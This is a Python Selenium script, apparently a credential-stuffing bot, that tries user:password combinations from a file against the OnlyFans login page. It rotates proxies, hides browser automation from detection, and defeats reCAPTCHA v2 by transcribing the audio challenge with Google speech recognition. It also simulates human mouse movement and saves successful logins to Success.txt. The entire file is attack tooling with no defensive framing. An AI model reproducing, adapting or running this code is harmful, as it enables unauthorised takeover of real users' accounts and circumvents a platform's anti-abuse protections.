'''
(Understand flow and then go research)
import selenium....
BY
Actions
OS (for files transversal)
Options and Properties

driver has: options, profile and executable path
executable path is chromedriver (Chrome webdriver)
Options = creation then headless and User agent that will fit program
Properties = Proxies

readfile contains:
User:Pass iteration and split of both components


driver.find_element(By.XPATH, "User")
button1 = press of previous element

driver.find_element(By.XPATH, "Password")
button2 = press of previous element

driver.find_element(By.XPATH, "Login Button")
button3 = press of previous element

driver.find_element(By.XPATH, CAPTCHA(1,2,3,4))
button4 = press of previous element

1 = iframe selection
2 = Verification of CAPTCHA v2 iframe
3 = Buster extension ability in driver and audio selection
4 = Completion

WriteFile contains:
1) Success in Success file
2) Fails are not written


'''
from scipy import interpolate
import unittest
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import selenium.common.exceptions
from selenium.webdriver.chrome.webdriver import WebDriver as webdriver
from selenium.webdriver.common.proxy import *
from selenium.common.exceptions import NoSuchElementException
import time
from random import seed, uniform
from random import randint
import os
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
import numpy as np
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
import requests
import undetected_chromedriver as uc
import soundfile
import speech_recognition as sr
from fake_useragent import UserAgent
from pyvirtualdisplay import Display







class SyncMe:
    
    #Main function
    User = None
    Password = None
    headless = False
    options = None
    profile = None
    capabilities = None
    
    
    def __init__(self):
                

            self.test_run()
  
                
                
  
              

    def main_func(self, index, User, Password):
                            try:
                                try:
                        
                                                
                                    
                                    current_dict = {"proxyType": ProxyType.AUTODETECT, "httpsProxy": index, "sslProxy": index}
                                    proxy = Proxy(current_dict)
                                    cap = DesiredCapabilities.CHROME.copy()
                                    cap['platform'] = 'MAC'
                                    cap['version'] = '10.13.6'

                                    proxy.add_to_capabilities(cap)
                                    opts = Options()
                                    
                                    header = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
                                                        
                                    opts.add_argument(f"user-agent={header}")
                                    opts.add_argument('--disable-blink-features')
                                    opts.add_argument('--disable-blink-features=AutomationControlled')
                                    opts.add_argument('--no-sandbox')
                                    opts.add_argument('--window-size=1920,1080')
                                    opts.add_argument('--headless')
                                    opts.add_argument('--disable-gpu')
                                    opts.add_argument('--allow-running-insecure-content')
                                    opts.add_argument("--headless")
                                    opts.add_experimental_option('useAutomationExtension', False)
                                    opts.add_experimental_option("excludeSwitches", ["enable-automation"])
                                    opts.add_argument("--disable-extensions")
                                    service = ChromeService(ChromeDriverManager().install())              
                                    
                                    print("Using proxy: " + str(proxy))
                                    driver = webdriver(executable_path= 'locationofdriver',options = opts, service=service,  desired_capabilities = cap)
                                    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
                        
                        
                        
                                                                                
                                except:
                                    print("Unacceptable format...Skipping...")    
                                

                                try:

                                    time.sleep(5)
                                    driver.get('https://onlyfans.com')
                                    wait = WebDriverWait(driver, 10)
                                    
    
                                    time.sleep(10)   
                                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH,"/html[1]/body[1]/div[1]/div[2]/div[1]/div[1]/div[1]/div[2]/div[1]/form[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/input[1]")))        
                                    button1 = driver.find_element(By.XPATH, "/html[1]/body[1]/div[1]/div[2]/div[1]/div[1]/div[1]/div[2]/div[1]/form[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/input[1]")
                                    button2 = driver.find_element(By.XPATH,"/html[1]/body[1]/div[1]/div[2]/div[1]/div[1]/div[1]/div[2]/div[1]/form[1]/div[2]/div[1]/div[1]/div[1]/div[1]/div[1]/input[1]")
                                    search_btn = driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div[1]/div/div/div[2]/div/form/button")
                                    action = ActionChains(driver)
                                    action.move_to_element(button1).click(button1).perform()
                                    button1.send_keys(User)
                                    time.sleep(10)
                                    action.move_to_element(button2).click(button2).perform()
                                    button2.send_keys(Password)
                                    time.sleep(10)
                                except:
                                    print("Proxy Timed out...")

                                    driver.close()
                                    x = False
                                    return x
                                try:
                                    action.move_to_element(search_btn).click(search_btn).perform()
                                    print("Invalid Combo?... We'll see due to webform.")
                                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "/html[1]/body[1]/div[1]/div[2]/main[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/button[1]/span[1]/*[name()='svg'][1]/*[name()='use'][1]")))
                                    w_file = open("Success.txt", 'a+')
                                    w_file.write("Login: "+ User + ":" + Password + "\n")
                                    w_file.close() 
                                    print("Success!")

                                except Exception as exc:
                                    print("Button Not found, it's 'stale'!")
                                        

                                                
                                    print("looping due to 'stale' page.'")
                                    time.sleep(10)
                                    print("\nLOGIN ATTEMPT:" +
                                    User + ":" + Password + "\n")
    
                                                
                                    try:
                                                WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.XPATH, "/html[1]/body[1]/div[1]/div[2]/main[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/button[1]/span[1]/*[name()='svg'][1]/*[name()='use'][1]")))
                                                w_file = open("Success.txt", 'a+')
                                                time.sleep(5)
                                                WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, "/html[1]/body[1]/div[1]/div[2]/main[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/button[1]/span[1]/*[name()='svg'][1]/*[name()='use'][1]")))
                                                button1S = driver.find_element(By.XPATH,"/html[1]/body[1]/div[1]/div[2]/main[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/button[1]/span[1]/*[name()='svg'][1]/*[name()='use'][1]")
                                                ActionChains.move_to_element(button1S).click(button1S).perform()
                                                WebDriverWait(driver,5).until(EC.presence_of_element_located((By.XPATH, '/html[1]/body[1]/div[1]/div[2]/header[1]/div[1]/div[3]/div[3]/button[2]/span[1]')))
                                                button2S = driver.find_element(By.XPATH,'/html[1]/body[1]/div[1]/div[2]/header[1]/div[1]/div[3]/div[3]/button[2]/span[1]')
                                                ActionChains.move_to_element(button2S).click(button2S).perform()
                                                w_file.write("Login: "+ User + Password + "\n")
                                                w_file.close()            
                                                driver.get("https://OnlyFans.com")
                                                print("Success!")
                                                    #Insert Sus File Verification for 2ed attempt
                                                print("\n2ed Login attempt failed\n")
    
                                                            
                                                                #Insert SUS file and verification later
                                    except:
                                                print("No Success with User/Pass")
                                                        
                                                print("1st Login attempt failed: Solving Captcha!\n")
                                    try:
                                                        time.sleep(10)
                                                        driver.switch_to.frame(driver.find_elements(By.TAG_NAME,"iframe")[0])
                                                        check_box = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, 'recaptcha-anchor')))                                                          
                                                        time.sleep(10)
                                                        SyncMe.human_like_mouse_move(action, check_box)

                                                        check_box.click()

                                                        check_box.click()
                                                        time.sleep(10)
                                                        action = ActionChains(driver);
                                                        SyncMe.human_like_mouse_move(action, check_box)
                                                        driver.switch_to.default_content()
                                                        #thats self.wait for re_Captcha if dont have re_Captcha will pass
                                                        wait.until(EC.presence_of_element_located((By.XPATH, '//iframe[@title="recaptcha challenge expires in two minutes"]')))
                                                        #print fiding the Captcha with loading emoji
                                                        print('Fiding the Captcha...\n')
                                                        #change to the iframe of the captcha
                                                        wait.until(EC.frame_to_be_available_and_switch_to_it((By.XPATH, '//iframe[@title="recaptcha challenge expires in two minutes"]')))
                                                        #click on the audio button
                                                        WebDriverWait(driver, 3).until(EC.element_to_be_clickable((By.ID, 'recaptcha-audio-button'))).click()
                                                        #get attribute of the audio source
                                                        audio_source = wait.until(EC.presence_of_element_located((By.XPATH, '//audio[@id="audio-source"]'))).get_attribute('src')
                                                    
                                                        print('Downloading the audio file...\n')
                                                        #download the audio file with requests
                                                        audio_file = requests.get(audio_source, stream=True)

                                                        #save the audio file as wav
                                                        with open('audio.wav', 'wb') as f:
                                                            f.write(audio_file.content)
                                                            data, samplerate = soundfile.read('audio.wav')
                                                            soundfile.write('audio.wav', data, samplerate, subtype='PCM_16')
                                                            print('Audio file downloaded...\n')

                                                        print('Converting the audio file to text...\n')
                                                        
                                                        r = sr.Recognizer()
                                                        with sr.AudioFile('audio.wav') as source:
                                                            audio = r.record(source)
                                                            print('Audio file converted to text...\n')
                                                        
                                                        print('Audio file converted to text...\n')
                                                        print('Inputing the text...\n')

                                                        wait.until(EC.element_to_be_clickable((By.ID, 'audio-response'))).send_keys(r.recognize_google(audio))
                                                        wait.until(EC.element_to_be_clickable((By.ID, 'recaptcha-verify-button'))).click()
                                                    
                                                        print('Captcha solved...\n')
                                                        time.sleep(10)
                                                        driver.switch_to.default_content()
                                    except:
                                                        print("Frame not found") 
                                    search_btn = WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/div[2]/div[1]/div/div/div[2]/div/form/button")))
                                    ActionChains(driver).move_to_element(search_btn).click(search_btn).perform()
                                    time.sleep(5)
                                    print("Invalid Combo?... We'll see due to webform.")
                                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "/html[1]/body[1]/div[1]/div[2]/main[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/button[1]/span[1]/*[name()='svg'][1]/*[name()='use'][1]")))
                                    w_file = open("Success.txt", 'a+')
                                    w_file.write("Login: "+ User + ":" + Password + "\n")
                                    w_file.close() 
                                    print("Success!")
                                    driver.close()                                                                                                 
                            except:
                                print("Automatic Loop in Selenium Bot") 
    
    


    
    
                                            

                                        
                                        

                        
                                                    
                               
                                    

    def human_like_mouse_move(action, start_element):
            
            points = [[6,2], [3,2], [0,0], [0,2]]
            points = np.array(points)
            x = points[:,0]
            y = points[:,1]

            t = range(len(points))
            ipl_t = np.linspace(0.0, len(points) - 1, 100)

            x_tup = interpolate.splrep(t,x, k=1)
            y_tup = interpolate.splrep(t,y, k=1)

            x_list = list(x_tup)
            xl = x.tolist()
            x_list[1] = xl + [0.0, 0.0, 0.0, 0.0]
            
            y_list = list(y_tup)
            yl = y.tolist()
            y_list[1] = yl + [0.0, 0.0, 0.0, 0.0]

            x_i = interpolate.splev(ipl_t, x_list)
            y_i = interpolate.splev(ipl_t, y_list)
            startElement = start_element
            action.move_to_element(startElement);
            action.perform();
            c = 5
            i = 0
            for mouse_x, mouse_y in zip(x_i, y_i):
                action.move_by_offset(mouse_x,mouse_y);
                action.perform();
                i+= 1
                if i == c:
                    break;  

                            
    '''def normal_func():
        opts = Options()

        header = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
                                            
        opts.add_argument(f"user-agent={header}")
        opts.add_argument('--disable-blink-features')
        opts.add_argument('--disable-blink-features=AutomationControlled')
        opts.add_argument('--no-sandbox')
        opts.add_argument('--window-size=1920,1080')
        opts.add_argument('--headless')
        opts.add_argument('--disable-gpu')
        opts.add_argument('--allow-running-insecure-content')
        opts.add_argument("--headless")
        opts.add_experimental_option('useAutomationExtension', False)
        opts.add_experimental_option("excludeSwitches", ["enable-automation"])
        opts.add_argument("--disable-extensions")

        
        service = ChromeService(ChromeDriverManager().install())
                                            
                                            
        driver = webdriver(executable_path= 'Users/locationofdriver/Desktop/selenium-bruteforcer/driver',options = opts, service=service)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")     '''   
                      

    def test_run(self):
            Choice = input("Utilize Proxy List? [Y/N]?")
            if Choice == 'Y' or 'y':
                with open('proxy-list.txt', 'r') as proxies:
                            arr = []
                            arr_U=[]
                            arr_P = []
                            mod = 0
                            for line2 in proxies:
                                '''try:'''
                                Add_res = line2.split(":")[0]
                                Port = line2.split(":")[1]
                                print("\nProxy: ", Add_res, ":", Port)
                                arr.append(str(Add_res)+":"+str(Port))
                            for i in range(0, len(arr)):
                                index = arr[i]
                                
                                
                                
                                
                                ''' except: 
                                    print("Unacceptable format: " + line2 + " Skipping...")               ''' 
                                with open('readfile.txt', 'r') as r_file:
                                        print("Read File open")
                                        for line in r_file:
                                                        '''try:'''
                                                        User = line.split(":")[0]
                                                        Password = line.split(":")[1]
                                                        print("\nCOMBO: ", User, ":", Password)

                                                        arr_U.append(User)
                                                        arr_P.append(Password)
                                                        '''except: '''
                                                        '''print("Unacceptable format: " + line + " Skipping...")'''
                                        
                                        for i2 in range(0,len(arr_U)):
                                                    User = arr_U[i2]
                                                    Password = arr_P[i2]
                                                    x = True
                                                    
                                                    x = SyncMe.main_func(self, index, User, Password)
                                                    if x == False:
                                                            mod = mod + 1
                                                            print("Looping Proxies")
                                                    if mod == len(arr):
                                                            mod = 0
                                                    index = arr[mod]
                                                    
                                                            
                                                            
                                                            
                                                             
if __name__ == "__main__": 
    SyncMe()
